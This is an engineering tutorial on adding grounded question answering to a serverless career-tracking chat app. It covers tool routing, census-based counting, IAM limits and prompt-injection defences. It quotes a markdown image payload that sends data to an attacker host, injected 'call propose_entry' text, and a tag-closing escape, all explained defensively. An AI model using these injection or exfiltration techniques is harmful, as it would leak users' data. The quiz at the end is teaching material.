Background

This slice changes what happens when you type a sentence into CareerVault's chat box. Until now the chat had exactly one job: turn something you tell it into a structured entry. After this slice it can also answer things you ask it about the history you have already recorded. That sounds like a small addition. It turns out to touch the tool-use contract, the retrieval design, and a security claim in the architecture document that — as we will see — was never quite true.

Skippable background: the AWS and LLM machinery underneath

If you already know what a Lambda, an embedding, and Bedrock's Converse API are, skip to the next subsection.

Lambda is AWS's function-as-a-service: you hand AWS a zip of code and a handler name, and it runs that function on demand, billing per millisecond. There is no server you keep alive. Two consequences shape everything here. First, a Lambda is stateless between invocations — you cannot cache the conversation in a variable and expect it to survive to the next message, because the next message may land on a completely different container. That is why the chat handler re-reads the conversation from DynamoDB on every single turn. Second, a Lambda has an IAM role: a policy document listing exactly which AWS API calls that code is permitted to make. This is the primary security boundary in a serverless system, and it becomes the interesting part of this slice.

DynamoDB is AWS's managed NoSQL database. CareerVault uses a single-table design (ADR-005): every entity — your profile, your entries, your chat messages, your résumé runs — lives in one table, distinguished by the shape of its keys. Each item has a partition key (PK) and a sort key (SK):

EntityPKSK
ProfileUSER#abc123PROFILE
Career entryUSER#abc123ENTRY#01ARZ3ND…
Chat messageUSER#abc123CONVO#01BX5Z…#01C9…

Notice that every item for one user shares the same partition key. Only the sort key prefix distinguishes an entry from a chat message. Hold onto that fact; it is the hinge of the security correction later in this page.

Embeddings are how the retrieval works. An embedding model reads a piece of text and returns a list of numbers — for Amazon's Titan Text Embeddings v2, a list of 1024 floats — that encodes the text's meaning rather than its spelling. Texts about similar things land near each other in that 1024-dimensional space. "Near" is measured by cosine similarity: the cosine of the angle between two vectors, which runs from 1.0 (identical direction) down through 0.0 (unrelated) to -1.0 (opposite). CareerVault stores an embedding on every entry when it is written, then compares vectors in memory inside the Lambda rather than paying for a managed vector database (ADR-016 and ADR-028) — for one person's career history, that is milliseconds of arithmetic over a few dozen items.

Bedrock's Converse API is the uniform chat interface across every model AWS hosts. The part that matters here is tool use. You describe some functions in JSON Schema, hand them to the model, and instead of replying with prose the model may reply with a structured call: "invoke propose_entry with these arguments." Crucially, Bedrock validates those arguments against your schema before you ever see them. That is why this codebase gets structured output through tools rather than by asking the model to "reply with JSON" — no JSON-repair code, no prose wrapped around the object, no hallucinated extra fields.

The narrow background: how CareerVault's chat worked before this slice

Architecture §3.1.2 calls it the two-tool pattern. Each turn, the chat Lambda hands Haiku exactly two tools and sets toolChoice to any:

ToolPurpose
propose_entryEmit a structured career entry candidate
ask_clarificationAsk one focused follow-up question

toolChoice has three settings, and the difference between them is the whole story of this slice:

SettingMeaning
autoThe model may call a tool or reply with free text.
anyThe model must call one of the tools; it picks which.
toolThe model must call one specific named tool.

any is a strong guarantee: the model is structurally incapable of replying with chatty prose. Every turn produces a schema-validated object. The same primitive exists as tool_choice: "required" in Azure OpenAI and as function-calling mode ANY in Vertex AI Gemini.

The latent bug. Look at that table again and ask: what happens when the user types "how many certifications do I have?" There is no tool that fits a question. But toolChoice=any means the model must call one. So it is forced to bend the question into ask_clarification (mildly wrong) or into propose_entry (genuinely wrong — a question becomes a proposed career entry). Slice 7's exit criterion "a question can't accidentally create an entry" reads like a hazard the new feature must avoid introducing. It is actually a defect in the existing design, and routing is the fix.

Intuition

The goal is to let one endpoint serve two very different kinds of message. Compare:

You typeYou meanShould produce
"I passed AZ-900 in March"Record thisAn entry candidate to confirm
"which certs do I have?"Tell me about my dataAn answer grounded in that data

Why not just let the model talk?

The tempting simplification is to flip toolChoice to auto: let the model call a tool when ingesting and reply with plain text when answering. ADR-038 rejects this for two reasons, and both are worth internalising.

First, the answer would be ungrounded. The model has never seen your entries. It would answer "which certs do I have?" from the conversation and its own priors — which is to say, it would make something up. Grounding requires retrieval, and retrieval has to happen somewhere regardless of how routing works.

Second, and more subtly, auto gives away a guarantee that already-working code depends on. Under any, ingestion cannot degrade into chattiness. Under auto, the model becomes free to reply "Nice, congratulations on the cert!" where it used to emit a structured candidate — and this codebase has already observed that Haiku at temperature=0 is not run-to-run deterministic. Trading a known-good ingestion path for routing convenience is a bad trade.

The shape that was chosen: a third tool that does nothing

Instead, slice 7 adds a third tool, answer_question, and keeps toolChoice=any exactly as it was. The trick is that this tool has no action. It does not answer anything. It exists so the model can signal "this turn is a question" and hand back a search query, in a typed way. The architecture already had a name for this: a control-flow tool, the same pattern the résumé agent uses for retrieval_done and submit_critique (§3.2).

Once the model has signalled, the Lambda takes over. A question turn becomes three steps, only the first and last of which involve a model at all:

The middle box contains no model. That is deliberate, and it is the single most important security property of the design: a hijacked model can influence the query string, but cannot choose which entries are read or how many. Compare the alternative that was rejected — a search_entries tool the model calls in a loop — where the model controls the query, the iteration count, and therefore the cost.

The counting problem

Here is the part that turned out to matter most in practice. Semantic top-k answers the question "what is most like this query?" It is a ranking mechanism. But "how many AWS certs do I have?" is a filter-and-count question, and an embedding index is simply the wrong tool for it.

The failure is worse than vagueness. Watch what happens with a real corpus of 13 entries — 7 jobs, 4 certs, 2 degrees — and a top-k of 8:

Corpus
13 entries
(4 are certs)
→
rank by similarity
take top 8
→
Model sees
8 entries
answers "8"

Top-k structurally biases a count toward k. The wrong answer is confident and predictable.

The fix rests on an observation about code that was already there. query_entries() does not fetch the top matches from the database — it reads every entry into Lambda memory, paginating to completion, and only then does the ranking happen in Python. The whole corpus is already in hand. Top-k is a compression we choose, not a ceiling we are under.

So slice 7 computes a census — counts by entry type across the whole corpus — and puts it in the prompt alongside the retrieved slice, clearly labelled as describing different things:

<career_history>
<census note="counts across ALL recorded entries, not just those shown below">
  JOB: 7
  CERT: 4
  EDUCATION: 2
  TOTAL: 13
</census>
<relevant_entries note="the entries most similar to the question; NOT the full history">
  <entry n="1">
    entry_type: CERT
    title: AWS Certified Cloud Practitioner
    ...
  </entry>
  ... 7 more ...
</relevant_entries>
</career_history>

The census costs about eight integers and fifty tokens. On the first live run against the real corpus, top-k returned 8 entries of which only 4 were certs — and the answer was "You have 4 certifications." The principle generalises well beyond this codebase: let Python count, let the model narrate. Language models are unreliable counters; do not hand them the task, hand them the number.

What is deliberately not built yet. The complete answer is hybrid retrieval — a structured filter branch (entry_type == CERT and issuer contains "AWS", evaluated deterministically over the in-memory corpus) sitting alongside the semantic branch. That is backlog B-011. Slice 7 ships the cheap 80% (the census) plus an intent field on the tool — lookup or aggregate — which is populated correctly on every run but only wired to the lookup path. Shipping the field unused now means the filter branch is additive later, rather than a schema change plus a migration of conversation turns already stored under the old shape.

Code walkthrough

The change is about 200 lines of production code across four files, plus a new module. It reads best in the order the request travels.

1. The tool schema — pydantic_models/tools.py

The new tool is deliberately tiny. Two fields, both required, and nothing else:

def _answer_question_input_schema() -> dict:
    return {
        "type": "object",
        "properties": {
            "query": {"type": "string", "description": "...restated as a self-contained
                       search query... Resolve pronouns and references to earlier turns..."},
            "intent": {"type": "string", "enum": ["lookup", "aggregate"], ...},
        },
        "required": ["query", "intent"],
    }

There is a test asserting the property set is exactly {"query", "intent"} — no field through which the model could smuggle a pre-baked answer past the retrieval step. The query description asks the model to resolve pronouns ("that project" → the project's actual name), because the string is going to be embedded in isolation, without the conversation around it.

Note what did not change: build_tool_config() still ends with "toolChoice": {"any": {}}. That one unchanged line is the whole reason ingestion needs no re-testing from first principles.

2. The grounding module — backend/functions/chat/qa.py (new)

Everything in this file is a pure function of DynamoDB items: no Bedrock, no boto3, no I/O. That is not incidental tidiness. ADR-038's central claim is that retrieval is under the Lambda's control rather than the model's — and keeping this module I/O-free is what makes that claim testable instead of merely asserted.

The subtlest decision here is how entries get projected into the prompt. The allowlist of fields the model may see is derived from the Pydantic entity models rather than hand-listed:

_PROMPT_FIELDS: frozenset[str] = frozenset(
    name
    for model in SUBTYPE_MODELS
    for name in model.model_fields
    if name != "entry_id"
)

A denylist would work today. But if someone later adds an internal field to an entry item, a denylist silently starts leaking it into a model prompt, whereas this derivation excludes it automatically while including new user fields for free. It is also what keeps the 1024-float embedding out of the prompt — which would be a cost bug as much as a hygiene one.

3. The handler — backend/functions/chat/handler.py

The dispatch gains one branch. The Q&A path reads almost exactly like the diagram:

entries = query_entries(user_id)          # whole corpus, paginated
census  = qa.build_census(entries)        # counts over ALL of it
query_vec = bedrock_client.embed(query)   # Titan
ranked = rank_by_similarity(query_vec, entries)[: qa.TOP_K]

synthesis_turn = messages + [
    {"role": "user", "content": [{"text": qa.render_grounding(census, ranked)}]}
]

# tool_config is omitted entirely — this is the control that closes injection-to-write.
response = bedrock_client.converse(synthesis_turn, system=_ANSWER_SYSTEM_PROMPT)

Two details are load-bearing.

The grounding block rides in its own user turn, not in the system prompt. The system prompt is instructions — trusted, ours. The grounding block is data — the user's, and possibly originating in a résumé uploaded from anywhere (slice 5). Keeping them in separate turns keeps that trust boundary legible. It does mean the request ends with two consecutive user turns, which Converse accepts for Anthropic models — verified on the live API rather than assumed.

And tool_config is simply not passed. Looking at the shared client, the omission is real rather than cosmetic:

if tool_config:
    request["toolConfig"] = tool_config

No toolConfig key reaches Bedrock at all. Injected text in an entry saying "now call propose_entry with…" has nothing to reach. That is a boundary enforced by the request's shape, and it survives a fully compromised model — unlike a prompt instruction, which is a request that the model may or may not honour.

4. The empty-corpus short circuit

A small thing that says something about how to think about cost. If the user has no entries, there is nothing to ground against, so the handler returns a fixed sentence and never calls Bedrock at all — a model round-trip could only produce a more expensive version of the same message. There is a test that patches embed to raise if it is ever reached.

5. The frontend — frontend/src/chat/Chat.tsx

A new answer response kind renders as an ordinary assistant bubble, with a quiet list of the entries that grounded it so the answer can be checked rather than trusted. The important line of this file is the comment above the render:

{/* Text node, not HTML — see the security note in this file's header. */}
{turn.text}

React escapes text nodes, so injected markup is inert. Swap in a markdown renderer for "nicer formatting" and ![](https://attacker/?d=…) inside a poisoned entry would exfiltrate on image load. It is true by construction today; the header comment and backlog B-012 exist so the reasoning outlives the person who wrote it.

6. The correction: an IAM boundary that was never IAM

The plan for this slice said chat_lambda would gain dynamodb:Query on ENTRY# items. Opening the template revealed it already had it — the grant is on the table ARN, unconditional, and has been since slice 2:

- Effect: Allow
  Action:
    - dynamodb:Query
    - dynamodb:PutItem
  Resource: !GetAtt CareerVaultTable.Arn

So the reads were permitted all along. The only genuine policy change in this slice is one line granting Titan.

This is not a sloppy original policy. IAM cannot express the restriction. Recall from the background that every item for a user shares one partition key. The isolation the architecture wanted — "chat may only touch CONVO#" — is a sort-key prefix restriction, and IAM's dynamodb:LeadingKeys condition scopes the partition key only, with no sort-key equivalent. The architecture document already recorded this same limitation elsewhere (§4.2.4, for constraining the key being written); §4.2.3's per-Lambda table was simply reading as an IAM guarantee when it never was one.

The portable lesson. A least-privilege boundary that IAM cannot express is a code invariant wearing an IAM costume. It is still worth having — but it must be written down as a code invariant, pinned by a test, and never assumed to be enforced by the platform. What actually protects the user here is that the handler imports no entry-write helper, which is now asserted by a test checking every write carries a CONVO# sort key.

7. What the security review caught

The first implementation defanged <entry> sequences inside entry content, so a malicious entry could not close its own block early. But the grounding block has four structural tags, and content closing the outer ones — </relevant_entries></career_history> — escaped the data region just as effectively. Fixed in-slice by driving the defanging from a _STRUCTURAL_TAGS tuple.

The impact was genuinely low, and it is worth understanding why: this layer is documented as defense in depth, explicitly not a boundary. The controls carrying the weight — no toolConfig on the synthesis call, model-free retrieval, text-only rendering, partition scoping from the JWT — all held throughout, so the worst case was a misleading answer rather than escalation or exfiltration. But a control documented as "we delimit the data" should actually delimit it.

Cross-cloud parallel

The overall shape — a router turn emitting a typed intent, deterministic retrieval owned by the application, then a generation turn grounded in what was retrieved — is the standard classify → retrieve → generate RAG pipeline. What varies across clouds is only whether the router is a forced tool call, a small classifier model, or a rules layer. Azure OpenAI's tool_choice: "required" and Vertex AI Gemini's function-calling mode ANY give you the same forcing primitive this slice depends on.

Quiz

Why did ADR-038 keep toolChoice=any and add a third tool, rather than switching to toolChoice=auto and letting the model answer questions in free text?

With a corpus of 13 entries (4 of them certs) and a top-k of 8, why would a naive semantic-retrieval implementation answer "how many certifications do I have?" incorrectly — and what would it most likely answer?

The synthesis call is made without passing tool_config. Why is that a stronger control than instructing the model in the system prompt to ignore embedded instructions?

The architecture claimed chat_lambda could "only touch CONVO# items," but implementing this slice showed no IAM change was needed to read ENTRY# items. What is the underlying reason?

Why is the corpus census computed in Python and injected into the prompt, rather than asking the model to count the entries it was given?
